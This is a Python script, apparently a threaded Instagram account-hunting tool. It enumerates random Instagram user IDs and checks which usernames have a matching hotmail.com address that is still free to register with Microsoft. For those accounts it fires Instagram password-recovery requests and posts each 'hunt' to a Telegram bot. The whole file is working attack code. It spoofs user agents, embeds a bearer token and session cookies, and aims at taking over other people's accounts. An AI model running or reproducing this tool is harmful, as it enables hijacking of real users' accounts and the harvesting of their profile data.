import requests,re,random,os,sys
from rich import print as g
from rich.panel import Panel
from threading import Thread
import webbrowser
webbrowser.open('https://t.me/z3x5j')

######CHIMOX#####
R = '\033[1;31;40m'
X = '\033[1;33;40m' 
F = '\033[1;32;40m' 
C = "\033[1;97;40m" 
C = "\033[1;97;40m"
B = '\033[1;36;40m'
K = '\033[1;35;40m'
V = '\033[1;36;40m'
######CHIMOX#####

good_hot,bad_hot,good_ig,bad_ig,check,mj,ids=0,0,0,0,0,0,[]
tok = input('• {}TOKEN{} ♪ {}TELE : {}'.format(B,C,V,K))
print("\r")
iD = input('• {}ID{} ♪ {}TELE : {}'.format(B,C,V,K))
os.system('clear')
def cookie(email):
    versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
    oss = [
    "Macintosh; Intel Mac OS X 10_15_7",
     "Macintosh; Intel Mac OS X 10_14_6",
      "iPhone; CPU iPhone OS 14_0 like Mac OS X",
       "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
    version = random.choice(versions)
    platform = random.choice(oss)
    user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
    try:
        url = 'https://signup.live.com'
        headers={'user-agent': user_agent}
        response = requests.post(url,headers=headers)
        amsc = response.cookies.get_dict()['amsc']
        match = re.search(r'"apiCanary":"(.*?)"', response.text)
        if match:
            api_canary= match.group(1)
            canary = api_canary.encode().decode('unicode_escape')
        else:pass
        return amsc,canary
    except :
        check_hot(email)

def insta1(email):
	global good_ig,bad_ig
	try:
		app=''.join(random.choice('1234567890')for i in range(15))
		response = requests.get('https://www.instagram.com/api/graphql')
		csrf = response.cookies.get_dict().get('csrftoken')
		rnd=str(random.randint(150, 999))
		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
		common_data = {'flow': 'fxcal','recaptcha_challenge_field': '',}
		data = {'email_or_username': email + "@hotmail.com", **common_data}
		headers = {'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','user-agent': user_agent,'viewport-width': '384','x-asbd-id': '129477','x-csrftoken': f'{csrf}','x-ig-app-id': app,'x-ig-www-claim': '0','x-instagram-ajax': '1007832499','x-requested-with': 'XMLHttpRequest'}
		response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=headers, data=data)
		if 'email_or_sms_sen' in response.text :
			good_ig+=1			
			check_hot(email)
		else:
			bad_ig+=1			
	except requests.exceptions.ConnectionError:
		insta1(email)

def insta2(email):
	bb =0
	global good_ig,bad_ig
	try:
		rnd=str(random.randint(150, 999))
		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
		url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
		head= {	
			 'Host': 'www.instagram.com',
			 'origin': 'https://www.instagram.com',
			 'referer': 'https://www.instagram.com/accounts/signup/email/',	
			 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
			 'user-agent': user_agent}
		data = {
		'email':email+"@hotmail.com"
		}
		res= requests.post(url,headers=head,data=data)
		if 'email_is_taken' in res.text:		
			good_ig+=1			
			check_hot(email)
		else:
			bad_ig+=1			
	except requests.exceptions.ConnectionError:
		insta2(email)

def check_hot(email):
	global good_hot,bad_hot
	versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
	oss = [
	"Macintosh; Intel Mac OS X 10_15_7",
	 "Macintosh; Intel Mac OS X 10_14_6",
	 "iPhone; CPU iPhone OS 14_0 like Mac OS X",
	  "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
	version = random.choice(versions)
	platform = random.choice(oss)
	user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
	try:	     
	     amsc,canary = cookie(email)	     
	     headers = {
      'authority': 'signup.live.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': canary,
      'user-agent': user_agent,
    }
	     cookies = {
      'amsc':amsc
    }
	     data = {
      'signInName': email+"@hotmail.com",
    }
	     response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',cookies=cookies,headers=headers,json=data)
	     if 'isAvailable' in response.text:
	     	good_hot+=1	     	
	     	hunting(email)	     	
	     else:	     	
	     	pass  	
	except requests.exceptions.ConnectionError:
		check_hot(email)	

def date_sc(Id):
 try:
     response = requests.get("https://mel7n.pythonanywhere.com/?id={}".format(Id)).json()
     return response['date']
 except BaseException as CHIMX :
  return CHIMX
	
def hunting(email):	
	try:
		headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
		data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+email+'"}',
    'ig_sig_key_version': '4',
}	
		try:
		    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
		    rest = response.json()['email']
		except :
			rest = False
		try:
			info=requests.get('https://anonyig.com/api/ig/userInfoByUsername/'+email).json()
		except :
			info = None			
		try:
			Id =info['result']['user']['pk_id']
		except :
			Id = None
		try:
			followers = info['result']['user']['follower_count']
		except :
			followers = None
		try:
			following = info['result']['user']['following_count']
		except :
			following = None
		try:
			post = info['result']['user']['media_count']
		except :
			post = None
		try:
			name = info['result']['user']['full_name']
		except :
			name = None
		date = date_sc(Id)			
		hunt = ("""
𝙣𝙚𝙬 𝙝𝙪𝙣𝙩 𝙗𝙧𝙤 𝙜𝙤𝙤𝙙 𝙡𝙪𝙘𝙠 🇵🇸
⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
𝙣𝙖𝙢𝙚 : {}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : {}
𝙚𝙢𝙖𝙞𝙡 : {}@hotmail.com
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {}
𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {}
𝙞𝙙 : {}
𝙙𝙖𝙩𝙚 : {}
𝙥𝙤𝙨𝙩 : {}
𝙧𝙚𝙨𝙚𝙩 : {}
⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
𝙗𝙮 : @XJ_JP	
		""".format(name,email,email,followers,following,Id,date,post,rest))
		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
		nnn = random.choice([R,X,F,B,K,V])
		print(nnn)				
		hunt2 = ("""
New Hunt Bro Good Luck  
Name : {}
Username : {}
Email : {}@hotmail.com
Folowers : {}
Folowing : {}
Id : {}
Date : {}
Posts : {}
Reset : {}
BY : @XJ_JP	
		""".format(name,email,email,followers,following,Id,date,post,rest))
		Hit = Panel(hunt2);g(Panel(Hit, title=f"Instagram | {good_hot}"))		
	except :
		hunting(email)

def check_email(email):
	global good_hot,bad_hot,bad_ig,good_ig,check
	Choice = random.choice(['insta1','insta2'])
	if Choice != 'insta2':
		insta1(email)
	else :
		insta2(email)
	b = random.randint(5,208)
	bo = f'\x1b[38;5;{b}m'
	check+=1
	sys.stdout.write(f"\r   {bo}[ {C}CHIMOX ™ {bo}] {C}Good Hot : {F}{good_hot}  {C}Bad IG : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo}Check•{check}\r")
	sys.stdout.flush()

def username1():
        headers = {"x-bloks-version-id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","user-agent": "Instagram 275.0.0.27.98 Android (28/9; 240dpi; 720x1280; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 458229258)","authorization": "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNTI1MjEwODYyODIiLCJzZXNzaW9uaWQiOiI1MjUyMTA4NjI4MiUzQUt4VGg2UUFzam5teVlIJTNBMjUlM0FBWWQtcXhaZGRTanNyQ3o2eW1ud0NuUGNINFpwbVd1a0JMN2p4Wm5Gb2cifQ==",}

        while True:
            try:
                id = str(random.randrange(128053904,438909537))
                data = {
                    "lsd": id,
                    "variables": '{"id":"' + id + '","render_surface":"PROFILE"}',
                    "server_timestamps": 'true',
                    "doc_id": '25313068075003303'
                }
                headers['X-Fb-Lsd'] = id
                response = requests.post("https://www.instagram.com/api/graphql", headers=headers, data=data).json()
                if 'data' in response and 'user' in response['data'] and 'username' in response['data']['user']:
                    username = response['data']['user']['username']
                    check_email(username)
            except:
                    username1()    
for i in range(25):
  Thread(target=username1).start()
